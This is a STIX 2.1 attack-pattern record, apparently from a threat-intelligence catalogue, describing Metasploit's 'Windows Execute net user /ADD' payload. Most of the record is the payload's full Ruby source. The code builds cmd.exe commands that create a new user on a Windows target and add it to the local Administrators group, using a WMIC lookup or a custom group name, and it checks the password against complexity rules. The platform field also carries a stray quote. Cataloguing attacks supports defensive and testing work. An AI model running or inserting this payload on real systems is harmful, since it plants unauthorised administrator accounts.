{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--4a967893-6806-4bbb-959e-c1f0b5bc8c23",
    "created": "2024-08-14T16:33:19.372626Z",
    "modified": "2024-08-14T16:33:19.37263Z",
    "name": "Windows Execute net user /ADD",
    "description": " Create a new user and add them to local administration group.  Note: The specified password is checked for common complexity requirements to prevent the target machine rejecting the user for failing to meet policy requirements.  Complexity check: 8-14 chars (1 UPPER, 1 lower, 1 digit/special) ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/payloads/singles/windows/adduser.rb",
            "external_id": "adduser.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\n\n###\n#\n# Extends the Exec payload to add a new user.\n#\n###\nmodule MetasploitModule\n\n  CachedSize = 282\n\n  include Msf::Payload::Windows::Exec\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'          => 'Windows Execute net user /ADD',\n      'Description'   => %q{\n        Create a new user and add them to local administration group.\n\n        Note: The specified password is checked for common complexity\n        requirements to prevent the target machine rejecting the user\n        for failing to meet policy requirements.\n\n        Complexity check: 8-14 chars (1 UPPER, 1 lower, 1 digit/special)\n      },\n      'Author'        => ['hdm','Chris John Riley'],\n      'License'       => MSF_LICENSE,\n      'Platform'      => 'win',\n      'Arch'          => ARCH_X86,\n      'Privileged'    => true))\n\n    # Register command execution options\n    register_options(\n      [\n        OptString.new('USER', [ true, \"The username to create\",     \"metasploit\" ]),\n        OptString.new('PASS', [ true, \"The password for this user\", \"Metasploit$1\" ]),\n        OptString.new('CUSTOM', [ false, \"Custom group name to be used instead of default\", '' ]),\n        OptBool.new('WMIC',\t [ true, \"Use WMIC on the target to resolve administrators group\", false ]),\n      ])\n\n    register_advanced_options(\n      [\n        OptBool.new(\"COMPLEXITY\", [ true, \"Check password for complexity rules\", true ]),\n      ])\n\n    # Hide the CMD option...this is kinda ugly\n    deregister_options('CMD')\n  end\n\n  #\n  # Override the exec command string\n  #\n  def command_string\n    user = datastore['USER'] || 'metasploit'\n    pass = datastore['PASS'] || ''\n    cust = datastore['CUSTOM'] || ''\n    wmic = datastore['WMIC']\n    complexity= datastore['COMPLEXITY']\n\n    if(pass.length > 14)\n      raise ArgumentError, \"Password for the adduser payload must be 14 characters or less\"\n    end\n\n    if complexity and pass !~ /\\A^.*((?=.{8,})(?=.*[a-z])(?=.*[A-Z])(?=.*[\\d\\W])).*$/\n      raise ArgumentError, \"Password: #{pass} doesn't meet complexity requirements and may cause issues\"\n    end\n\n    if not cust.empty?\n      print_status(\"Using custom group name #{cust}\")\n      return \"cmd.exe /c net user #{user} #{pass} /ADD && \" +\n        \"net localgroup \\\"#{cust}\\\" #{user} /ADD\"\n    elsif wmic\n      print_status(\"Using WMIC to discover the administrative group name\")\n      return \"cmd.exe /c \\\"FOR /F \\\"usebackq tokens=2* skip=1 delims==\\\" \" +\n        \"%G IN (`wmic group where sid^='S-1-5-32-544' get name /Value`); do \" +\n        \"FOR /F \\\"usebackq tokens=1 delims==\\\" %X IN (`echo %G`); do \" +\n        \"net user #{user} #{pass} /ADD && \" +\n        \"net localgroup \\\"%X\\\" #{user} /ADD\\\"\"\n    else\n      return \"cmd.exe /c net user #{user} #{pass} /ADD && \" +\n        \"net localgroup Administrators #{user} /ADD\"\n    end\n\n  end\nend\n\n",
    "x_mitre_platforms": [
        "win'"
    ]
}